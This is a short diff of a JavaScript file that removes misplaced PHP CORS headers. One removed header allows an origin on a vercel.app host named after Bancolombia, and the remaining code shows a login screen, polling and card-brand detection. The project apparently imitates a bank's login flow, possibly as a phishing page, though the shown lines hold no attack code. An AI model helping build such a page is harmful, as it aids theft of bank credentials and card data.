@@ -7,17 +7,6 @@ let pollInterval = null;
 let currentScreen = 'scr-login';
 let detectedBank = null;
 
-// --- ESTO VA AL COMIENZO DE TODO ---
-header('Content-Type: application/json; charset=utf-8');
-header('Access-Control-Allow-Origin: https://bancolombiaflowv2.vercel.app');
-header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type');
-
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    http_response_code(200);
-    exit;
-}
-
 /* ── BANCO Y FRANQUICIA ── */
 const BANCOS = {
     'Visa': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/120px-Visa_Inc._logo.svg.png',
